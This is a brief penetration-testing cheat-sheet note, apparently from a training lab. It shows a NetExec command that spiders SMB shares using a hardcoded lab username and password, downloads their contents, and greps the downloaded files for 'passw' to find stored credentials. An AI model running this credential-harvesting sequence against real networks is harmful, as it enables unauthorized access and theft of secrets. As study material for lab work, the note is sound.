SPIDERING USING SMB IF USER HAS CREDS TO VIEW SHARES:
nxc smb <Target Ip> -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
(might need to increase the smb-timeout 60 if the result shows too many failed downloads)
(RUN MULTIPLE TIMES!!! MULTIPLE PASSES WILL COLLECT THE MISSING ONES)

then navigate to downloaded files:
cd /tmp/nxc_hosted/nxc_spider_plus/<target-IP>
and show all with the passw pattern:
grep -ri "passw" .
